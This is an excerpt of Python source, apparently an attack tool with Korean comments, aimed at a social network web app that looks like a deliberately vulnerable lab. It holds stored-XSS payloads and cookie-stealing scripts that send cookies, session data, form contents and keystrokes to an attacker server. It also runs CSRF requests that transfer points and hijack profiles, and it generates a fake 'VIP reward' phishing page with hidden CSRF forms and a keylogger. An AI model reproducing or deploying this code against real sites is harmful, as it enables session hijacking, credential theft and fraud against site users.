...
class VulnerableSNSAttacker:
    ...
    def run_assessment(self):
        ...
        # 6. XSS 테스트 및 데모 생성
        print("\n[*] Running XSS tests...")
        self.test_stored_xss_debug_enhanced()

        print("\n[*] Creating educational XSS demo...")
        self.create_educational_xss_demo()

        # 7. Generate attack page
        ...
        print(f"[+] XSS Educational Demo: xss_educational_demo.html")
...
선착순 100명! 서두르세요!'''
    ...
    def test_stored_xss_debug_enhanced(self):
        ...
        # 3. XSS 페이로드 테스트 (기존 alert(1) 패턴 하이재킹!)
        print(f"\n[*] Step 3: Hijacking existing alert(1) patterns for '대머리 빡빡이'...")

        # 기존 성공한 alert(1) 패턴 분석
        print(f"[*] Analyzing existing successful alert(1) patterns...")
        try:
            # 현재 페이지에서 성공한 패턴들 추출
            current_response = self.session.get(f"{base_domain}/index.php", timeout=10)
            if current_response.status_code == 200:
                page_content = current_response.text

                # alert(1) 주변 컨텍스트 분석
                alert_contexts = []
                start = 0
                while True:
                    pos = page_content.find('alert(1)', start)
                    if pos == -1:
                        break

                    context_start = max(0, pos - 50)
                    context_end = min(len(page_content), pos + 50)
                    context = page_content[context_start:context_end]
                    alert_contexts.append(context)
                    start = pos + 1

                print(f"    Found {len(alert_contexts)} alert(1) instances")
                for i, ctx in enumerate(alert_contexts[:2], 1):  # 처음 2개만 출력
                    print(f"    Context #{i}: ...{ctx}...")
        except:
            print(f"    Pattern analysis failed, using default patterns")

        # 기존 성공 패턴 기반 하이재킹 페이로드들
        progressive_payloads = [
            # Level 1: 정확히 동일한 패턴, 숫자만 변경
            ("<script>alert(2)</script>", "exact_copy_number2"),
            ("<script>alert(3)</script>", "exact_copy_number3"),

            # Level 2: 기본 패턴 유지, 영어로 시도
            ('<script>alert("bald")</script>', "english_bald"),
            ('<script>alert("head")</script>', "english_head"),

            # Level 3: 짧은 한국어
            ('<script>alert("대머리")</script>', "korean_short1"),
            ('<script>alert("빡빡이")</script>', "korean_short2"),

            # Level 4: 이벤트 핸들러도 동일 패턴
            ('<img src=x onerror=alert(2)>', "img_copy_number2"),
            ('<img src=x onerror=alert("bald")>', "img_english_bald"),

            # Level 5: SVG도 동일 패턴
            ('<svg onload=alert(2)>', "svg_copy_number2"),
            ('<svg onload=alert("대머리")>', "svg_korean_short"),
        ]
                ...
                if post_response.status_code in [200, 302]:
                    ...
                    if check_response.status_code == 200:
                        ...
                        checks = {
                            ...
                            'alert_2_or_3': 'alert(2)' in page_content or 'alert(3)' in page_content,
                            'english_words': 'bald' in page_content or 'head' in page_content,
                            'korean_short': '대머리' in page_content or '빡빡이' in page_content,
                            'target_text': '대머리' in page_content,
                        ...
                        # 개수 비교
                        alert1_count = page_content.count('alert(1)')
                        alert2_count = page_content.count('alert(2)')
                        alert3_count = page_content.count('alert(3)')
                        bald_count = page_content.count('bald') + page_content.count('head')
                        korean_count = page_content.count('대머리') + page_content.count('빡빡이')

                        print(f"        📊 Count comparison:")
                        print(f"           alert(1): {alert1_count} times")
                        print(f"           alert(2/3): {alert2_count + alert3_count} times")
                        print(f"           English: {bald_count} times")
                        print(f"           Korean: {korean_count} times")

                        if found_indicators and (alert2_count + alert3_count + bald_count + korean_count > 0):
                            print(f"        ✅ XSS HIJACKING SUCCESS!")
                            print(f"        Found indicators: {found_indicators}")
                            ...
                            # 한국어 성공시 특별 처리
                            if korean_count > 0:
                                print(f"        🎉 KOREAN SUCCESS! '대머리' or '빡빡이' found!")

                                # 성공한 한국어 패턴으로 더 많이 추가
                                if '대머리' in page_content:
                                    target_word = '대머리'
                                else:
                                    target_word = '빡빡이'

                                print(f"        🚀 Adding more '{target_word}' instances...")

                                # 성공 패턴으로 대량 추가
                                successful_pattern = payload.replace('대머리', target_word).replace('빡빡이',
                                                                                                 target_word)

                                for extra in range(10):  # 10개 더 추가
                                    extra_data = {
                                        'content': f"{target_word} 추가 #{extra + 1}: {successful_pattern}"}
                                    try:
                                        self.session.post(post_url, data=extra_data, allow_redirects=False,
                                                          timeout=5)
                                    except:
                                        pass
                                ...
                                # 최종 확인
                                time.sleep(2)
                                final_check = self.session.get(f"{base_domain}/index.php", timeout=10)
                                if final_check.status_code == 200:
                                    final_korean_count = final_check.text.count(target_word)
                                    print(f"        🎯 Final '{target_word}' count: {final_korean_count}")
                            ...
                            working_payloads.append({
                                ...
                                'alert1_count': alert1_count,
                                'new_content_count': alert2_count + alert3_count + bald_count + korean_count,
                                'korean_success': korean_count > 0
                            })

                            # 취약점 기록
                            vuln_info = {
                                'type': 'Stored XSS - Pattern Hijacking Success',
                                'url': post_url,
                                'payload': payload,
                                'payload_type': payload_type,
                                'level': i,
                                'success_indicators': found_indicators,
                                'verification_method': 'Pattern hijacking + count analysis',
                                'alert_message': '대머리/빡빡이 (or alternatives)',
                                'hijack_success': True,
                                'korean_success': korean_count > 0,
                                'impact': 'HIGH - XSS pattern hijacking successful',
                                'cvss_score': 8.8
                            }
                            self.vulnerabilities['xss'].append(vuln_info)
                            ...
                            # 한국어 성공하면 즉시 중단
                            if korean_count > 0:
                                print(f"\n    [*] 🎉 KOREAN XSS SUCCESS! Stopping here.")
                                break

                            # 일반적으로는 몇 개 성공하면 계속
                            if success_count >= 3:
                                print(f"\n    [*] Found working patterns, testing more...")

                        else:
                            print(f"        ❌ No hijacking success")
    ...
    <body>
        ...
        try:
            ...
            # 파일이 실제로 생성되었는지 확인
            import os
            if os.path.exists('xss_educational_demo.html'):
                file_size = os.path.getsize('xss_educational_demo.html')
            ...
            print(f"[-] Error creating XSS demo: {e}")
...
<body>
    ...
    def test_advanced_cookie_stealing_xss(self):
        """고급 쿠키 탈취 XSS 공격"""
        self.print_section("Advanced XSS - Cookie/Session Stealing")
        ...
        print(f"[*] Setting up cookie stealing server endpoint...")

        # 쿠키 탈취용 XSS 페이로드들 (점진적 강화)
        cookie_stealing_payloads = [
            # Level 1: 기본 쿠키 탈취
            (f'<script>fetch("{self.attacker_server}/steal?cookie="+document.cookie)</script>',
             "basic_cookie_fetch"),
    ...
    fetch("{self.attacker_server}/steal", {{
        method: "POST",
        body: JSON.stringify(data),
        headers: {{"Content-Type": "application/json"}}
    }});
    </script>''', "advanced_session_steal"),

            # Level 4: DOM 기반 + 쿠키 + 폼 데이터 탈취
            (f'''<script>
    setTimeout(function() {{
        var allData = {{
            cookies: document.cookie,
            ...
            currentUser: document.body.innerHTML.match(/User ID[^0-9]*([0-9]+)/)?.[1] || 'unknown',
            forms: Array.from(document.forms).map(f => Array.from(f.elements).map(e => e.name + '=' + e.value)),
            location: window.location.href,
            timestamp: new Date().toISOString()
        }};

        // 여러 방법으로 전송 (하나라도 성공하게)
        fetch("{self.attacker_server}/steal", {{
            method: "POST", 
            body: JSON.stringify(allData),
            mode: "no-cors"
        }}).catch(() => {{
            new Image().src = "{self.attacker_server}/steal?data=" + encodeURIComponent(JSON.stringify(allData));
        }});
    }}, 1000);
    </script>''', "comprehensive_steal"),

            # Level 5: Keylogger + 쿠키 탈취 조합
            (f'''<script>
    // 쿠키 즉시 전송
    fetch("{self.attacker_server}/steal?type=cookie&data="+encodeURIComponent(document.cookie));
    ...
    document.addEventListener("keypress", function(e) {{
        keys += e.key;
        if(keys.length > 50) {{
            fetch("{self.attacker_server}/steal?type=keylog&data="+encodeURIComponent(keys));
            keys = "";
        }}
    }});
    ...
    document.addEventListener("submit", function(e) {{
        ...
        fetch("{self.attacker_server}/steal?type=form&data="+encodeURIComponent(JSON.stringify(data)));
    }});
    </script>''', "keylogger_combo"),

            # Level 6: 백그라운드 CSRF + 쿠키 탈취
            (f'''<script>
    // 1. 쿠키 탈취
    fetch("{self.attacker_server}/steal?step=1&cookies="+document.cookie);

    // 2. 현재 사용자 정보 수집
    var userInfo = document.body.innerHTML;
    var userId = userInfo.match(/user[^0-9]*([0-9]+)/i)?.[1] || '1';
    var points = userInfo.match(/([0-9]+)\\s*P/)?.[1] || '0';

    // 3. 백그라운드 CSRF 공격 실행
    setTimeout(function() {{
        // 포인트 전송 폼들 생성 및 실행
        [{self.attacker_user_id}].forEach(function(targetId) {{
            [1000, 500, 300, 100].forEach(function(amount, idx) {{
                setTimeout(function() {{
                    ...
                    ['send_gift=1', 'receiver_id='+targetId, 'points='+amount, 'gift_type=diamond'].forEach(function(param) {{
                    ...
                    // 공격 성공 알림
                    fetch("{self.attacker_server}/steal?step=csrf&amount="+amount+"&target="+targetId);
                }}, idx * 1000);
            }});
        }});
    }}, 2000);
    </script>''', "background_csrf_combo"),
        ]

        print(f"[*] Testing {len(cookie_stealing_payloads)} cookie stealing payloads...")

        success_count = 0

        for i, (payload, payload_type) in enumerate(cookie_stealing_payloads, 1):
            try:
                print(f"\n[*] Level {i} - {payload_type}")
                print(f"    Payload length: {len(payload)} chars")

                # XSS 페이로드 삽입
                data = {'content': f"🎁 선물 이벤트! 클릭하세요! {payload}"}
                ...
                if post_response.status_code in [200, 302]:
                    ...
                    if check_response.status_code == 200:
                        ...
                        # XSS 삽입 성공 확인
                        xss_indicators = [
                            'fetch(' in page_content,
                            'document.cookie' in page_content,
                            self.attacker_server in page_content,
                            '<script>' in page_content and '</script>' in page_content,
                            'onerror=' in page_content,
                            'setTimeout(' in page_content
                        ]

                        found_indicators = [i for i, found in enumerate(xss_indicators) if found]

                        if found_indicators:
                            print(f"    ✅ XSS PAYLOAD INJECTED SUCCESSFULLY!")
                            print(f"    Found XSS indicators: {found_indicators}")
                            print(f"    Payload type: {payload_type}")

                            # 페이로드가 페이지에 있는지 직접 확인
                            if self.attacker_server in page_content:
                                print(f"    🎯 ATTACKER SERVER URL FOUND IN PAGE!")
                                print(f"    🍪 Cookie stealing should be active now!")

                                # 성공한 XSS 정보 저장
                                vuln_info = {
                                    'type': 'Advanced XSS - Cookie/Session Stealing',
                                    'url': post_url,
                                    'payload': payload[:200] + '...' if len(payload) > 200 else payload,
                                    'payload_type': payload_type,
                                    'level': i,
                                    'stealer_endpoint': f"{self.attacker_server}/steal",
                                    'capabilities': [
                                        'Cookie theft',
                                        'Session storage theft',
                                        'Keylogging',
                                        'Form data interception',
                                        'Background CSRF execution'
                                    ],
                                    'impact': 'CRITICAL - Complete session hijacking + CSRF',
                                    'cvss_score': 10.0,
                                    'manual_verification': f"Visit {base_domain}/index.php and check {self.attacker_server}/steal for stolen data"
                                }
                                self.vulnerabilities['xss'].append(vuln_info)
                                ...
                                print(f"\n    📊 Attack Details:")
                                print(f"        Cookie Stealing URL: {self.attacker_server}/steal")
                                print(f"        Target Page: {base_domain}/index.php")
                                print(f"        Attack Capabilities: Cookie theft, Session hijacking, CSRF")
                                print(f"        Monitoring: Check attacker server logs")

                                # 레벨 6 (백그라운드 CSRF)인 경우 추가 정보
                                if payload_type == "background_csrf_combo":
                                    print(f"\n    🎯 ADVANCED CSRF COMBO ACTIVE!")
                                    print(f"        Automatic point transfer to: {self.attacker_user_id}")
                                    print(f"        Background execution: 2 seconds after page load")
                                    print(f"        Multi-step attack: Cookie theft → User enumeration → CSRF")

                                    self.log_event(
                                        'ADVANCED_XSS_CSRF',
                                        f'Multi-stage attack deployed: {payload_type}',
                                        'CRITICAL',
                                        {
                                            'attack_type': 'Cookie Theft + Background CSRF',
                                            'target_user': self.attacker_user_id,
                                            'stealer_url': f"{self.attacker_server}/steal",
                                            'csrf_delay': '2 seconds',
                                            'payload_level': i
                                        }
                                    )

                                    return True  # 최고 레벨 성공시 즉시 리턴

                            # 간단한 테스트용 알림도 추가
                            if any(word in page_content for word in ['alert(', 'Alert(', 'document.cookie']):
                                print(f"    📱 Simple XSS also detected (alert/cookie access)")

                        else:
                            print(f"    ❌ XSS payload filtered or blocked")

                            # 필터링 분석
                            if '&lt;script&gt;' in page_content:
                                print(f"        Detected: HTML encoding filter")
                            elif 'script' not in page_content.lower():
                                print(f"        Detected: Script tag removal")
                            else:
                                print(f"        Detected: Advanced filtering")
                else:
        ...
        print(f"\n[*] Cookie Stealing XSS Results:")
        print(f"    Total tests: {len(cookie_stealing_payloads)}")
        print(f"    Successful: {success_count}")

        if success_count > 0:
            print(f"\n🎉 COOKIE STEALING XSS SUCCESS!")
            print(f"💡 Monitor your attacker server at: {self.attacker_server}/steal")
            print(f"🎯 Victims visiting the main page will have their:")
            print(f"    - Cookies stolen")
            print(f"    - Session data extracted")
            print(f"    - Keystrokes logged")
            print(f"    - Forms intercepted")
            print(f"    - Background CSRF attacks executed")

            return True
        else:
            print(f"\n❌ All cookie stealing attempts failed")
            print(f"🛡️ Server has strong XSS protection")

            return False

    def test_direct_csrf_with_stolen_session(self):
        """탈취한 세션으로 직접 CSRF 공격"""
        self.print_section("Direct CSRF Attack with Session Hijacking")

        if not self.logged_in:
            print("[-] Login required")
            return False

        print(f"[*] Executing direct CSRF attacks...")
        print(f"[*] Attacker User ID: {self.attacker_user_id}")
        ...
        csrf_attacks = [
            {
                'name': 'Point Transfer Attack',
                'method': 'POST',
                'url': f"{base_domain}/profile.php",
                'data': {
                    'send_gift': '1',
                    'receiver_id': self.attacker_user_id,
                    'points': '5000',
                    'gift_type': 'diamond',
                    'message': 'Hacked via CSRF'
                }
            },
            {
                'name': 'Profile Modification Attack',
                'method': 'POST',
                'url': f"{base_domain}/profile.php",
                'data': {
                    'email': 'hacked@attacker.com',
                    'full_name': 'PWNED_BY_CSRF',
                    'update_profile': '1'
                }
            },
            {
        ...
        for i, attack in enumerate(csrf_attacks, 1):
            try:
                print(f"\n[*] CSRF Attack {i}: {attack['name']}")

                if attack['method'] == 'POST':
                    response = self.session.post(attack['url'], data=attack['data'], timeout=10)
                else:
                    params = '&'.join([f"{k}={v}" for k, v in attack['data'].items()])
                    response = self.session.get(f"{attack['url']}?{params}", timeout=10)
                ...
                success_indicators = [
                    ...
                    'changed' in response.text.lower(),
                    response.status_code in [200, 302]
                ]

                if any(success_indicators):
                    print(f"    ✅ CSRF ATTACK SUCCESS!")
                    print(f"    Attack: {attack['name']}")
                    print(f"    Target: {attack['url']}")
                    print(f"    Data: {attack['data']}")
                    ...
                    vuln_info = {
                        ...
                        'success_indicators': [ind for ind, found in
                                               zip(['success', 'updated', 'sent', 'changed', 'status_ok'],
                                                   success_indicators) if found],
                        'impact': 'CRITICAL - Unauthorized actions performed on behalf of victim',
                        'cvss_score': 9.1
                    }
                    self.vulnerabilities['csrf'].append(vuln_info)

                    # 특별한 공격들에 대한 추가 처리
                    if 'Point Transfer' in attack['name']:
                        print(f"        💰 Points transferred to attacker ID: {self.attacker_user_id}")
                    elif 'Profile Modification' in attack['name']:
                        print(f"        👤 Victim's profile compromised")
                    elif 'Password Change' in attack['name']:
                        print(f"        🔒 Victim's password potentially changed")
                    elif 'Admin Privilege' in attack['name']:
                        print(f"        ⚡ Privilege escalation attempted")

                else:
                    print(f"    ❌ Attack failed or blocked")

            except Exception as e:
                print(f"    ❌ Error: {str(e)[:50]}")

        print(f"\n[*] Direct CSRF Results:")
        print(f"    Total attacks: {len(csrf_attacks)}")
        print(f"    Successful: {success_count}")

        if success_count > 0:
            print(f"\n🎯 CSRF ATTACKS SUCCESSFUL!")
            print(f"💥 Victim's account has been compromised via:")
            for vuln in self.vulnerabilities['csrf']:
                print(f"    - {vuln['attack_name']}")

        return success_count > 0

    def generate_advanced_attack_page(self):
        """고도화된 공격 페이지 생성 (XSS + CSRF + 쿠키탈취)"""
        print("\n[*] Generating advanced multi-stage attack page...")

        if not self.attacker_user_id:
            self.attacker_user_id = "1"

        advanced_attack_html = f"""<!DOCTYPE html>  
    <html>
    <head>
        <title>🎁 VIP 회원 특별 혜택!</title>
        <meta charset="utf-8">
        <style>
            body {{
                font-family: 'Segoe UI', Arial, sans-serif;
            ...
            .attack-container {{
                ...
                max-width: 600px; margin: 50px auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }}
            .gift-icon {{ font-size: 80px; animation: bounce 2s infinite; }}
            @keyframes bounce {{ 0%, 100% {{ transform: translateY(0); }} 50% {{ transform: translateY(-15px); }} }}
            .btn {{ 
                background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                color: white; border: none; padding: 15px 40px; font-size: 1.1em;
                border-radius: 25px; cursor: pointer; margin: 10px; transition: all 0.3s;
            }}
            .btn:hover {{ transform: scale(1.05); }}
            .status {{ 
                background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 20px 0;
                color: #495057; font-weight: bold; min-height: 50px;
            }}
            .progress {{ 
                width: 100%; height: 20px; background: #e9ecef; border-radius: 10px; overflow: hidden;
            }}
            .progress-bar {{
    ...
    <body>
        <div class="attack-container">
            <div class="gift-icon">🎁</div>
            <h1>🎉 VIP 회원 특별 혜택!</h1>
            <p style="font-size: 1.3em; color: #dc3545;">💎 다이아몬드 회원 전용 20,000P + 특급 아이템!</p>

            <div id="status" class="status">혜택 준비 중... 잠시만 기다려주세요.</div>

            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>

            <button onclick="claimReward()" id="claimBtn" class="btn">
                💰 지금 바로 받기 💰
            </button>

            <p style="font-size: 0.9em; color: #6c757d;">
                ⏰ 이 혜택은 24시간 한정입니다. 놓치지 마세요!
            </p>
        </div>

        <!-- 숨겨진 공격 폼들 -->
        <div id="attackForms" style="display: none;"></div>
        ...
        <script>
            ...
            function startProgressBar() {{
                ...
                const interval = setInterval(() => {{
                    if (width >= 100) {{
                        ...
                        updateStatus("✅ 인증 완료! 혜택을 받을 준비가 되었습니다.");
                        document.getElementById('claimBtn').innerHTML = "🎯 혜택 받기 (클릭)";
                    }} else {{
                        width += 2;
            ...
            function stealSessionData() {{
                try {{
                    ...
                    console.log('[!] Session extraction error:', e);
                }}
            }}
            ...
            function sendStolenData(data) {{
                fetch(ATTACKER_SERVER + '/steal', {{
                    method: 'POST',
                    body: JSON.stringify({{type: 'session', data: data}}),
                    headers: {{'Content-Type': 'application/json'}},
                    mode: 'no-cors'
                }}).catch(() => {{
                    new Image().src = ATTACKER_SERVER + '/steal?type=session&data=' + 
                        encodeURIComponent(JSON.stringify(data));
                }});
            }}

            function claimReward() {{
                updateStatus("🎁 혜택 처리 중... 포인트와 아이템을 지급하고 있습니다.");
                document.getElementById('claimBtn').style.display = 'none';
                setTimeout(executeCSRFAttacks, 2000);
            }}

            function executeCSRFAttacks() {{
                console.log('[+] Starting CSRF attack phase');

                const attacks = [
                    {{type: 'gift', amount: 10000, message: 'VIP Special Gift'}},
                    {{type: 'gift', amount: 5000, message: 'Diamond Member Bonus'}},
                    {{type: 'gift', amount: 3000, message: 'Premium Reward'}},
                    {{type: 'profile', email: 'pwned@attacker.com', name: 'HACKED_ACCOUNT'}},
                ];
                ...
                attacks.forEach((attack, index) => {{
                    setTimeout(() => {{
                        if (attack.type === 'gift') {{
                            executeGiftCSRF(attack.amount, attack.message);
                        }} else if (attack.type === 'profile') {{
                            executeProfileCSRF(attack.email, attack.name);
                        }}

                        attackCount++;
                        updateStatus(`🎁 처리 중... (${{attackCount}}/${{attacks.length}}) 단계 완료`);
            ...
            function executeGiftCSRF(amount, message) {{
                ...
                iframe.name = 'csrf_target_' + Date.now();
                ...
                sendAttackNotification('gift_transfer', amount);
                console.log('[+] Gift CSRF executed: ' + amount + 'P');
            }}

            function executeProfileCSRF(email, name) {{
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = TARGET_SNS + '/profile.php';
                form.style.display = 'none';
                ...
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.name = 'csrf_profile_' + Date.now();
                form.target = iframe.name;
                ...
                sendAttackNotification('profile_change', email);
                console.log('[+] Profile CSRF executed');
            }}

            function sendAttackNotification(type, data) {{
                fetch(ATTACKER_SERVER + '/attack-log', {{
                    method: 'POST',
                    body: JSON.stringify({{
                        attack_type: type,
                        data: data,
                        timestamp: new Date().toISOString(),
                        victim_info: stolenData
                    }}),
                    headers: {{'Content-Type': 'application/json'}},
                    mode: 'no-cors'
                }}).catch(() => {{
                    new Image().src = ATTACKER_SERVER + '/attack-log?type=' + type + '&data=' + encodeURIComponent(data);
                }});
            }}

            function showSuccess() {{
                updateStatus("✅ 완료! VIP 혜택이 성공적으로 지급되었습니다!");

                document.getElementById('status').innerHTML = `
                    <div style="color: #28a745; font-size: 1.1em;">
                        🎉 축하합니다! 🎉<br>
                        💎 다이아몬드 회원 혜택이 지급되었습니다<br>
                        💰 20,000 포인트가 적립되었습니다<br>
                        🎁 특급 아이템이 인벤토리에 추가되었습니다<br><br>
                        <small style="color: #6c757d;">잠시 후 자동으로 메인 페이지로 이동합니다.</small>
                    </div>
                `;
            ...
            function activateKeylogger() {{
                document.addEventListener('keydown', function(e) {{
                    ...
                    if (keyBuffer.length > 100) {{
                        sendStolenData({{type: 'keylog', data: keyBuffer}});
                        keyBuffer = "";
                    }}
                }});
                ...
                document.addEventListener('submit', function(e) {{
                    ...
                    sendStolenData({{type: 'form_intercept', data: data}});
                }});
            ...
            window.addEventListener('beforeunload', function() {{
                if (keyBuffer && keyBuffer.length > 0) {{
                    navigator.sendBeacon(ATTACKER_SERVER + '/steal',
                        JSON.stringify({{type: 'final_keylog', data: keyBuffer}}));
                }}
            }});
        </script>
    </body>
        ...
        with open("advanced-attack.html", 'w', encoding='utf-8') as f:
            f.write(advanced_attack_html)

        print("[+] advanced-attack.html created!")
        print(f"[+] Multi-stage attack capabilities:")
        print(f"    🍪 Session/Cookie stealing")
        print(f"    💰 Multiple CSRF attacks (point transfer)")
        print(f"    👤 Profile modification")
        print(f"    ⌨️  Keylogger activation")
        print(f"    📝 Form interception")
        print(f"    🔄 Automatic cleanup & redirect")

        return 'advanced-attack.html'
    ...
    def dict_to_query_string(self, params_dict):
        """딕셔너리를 쿼리 스트링으로 변환"""
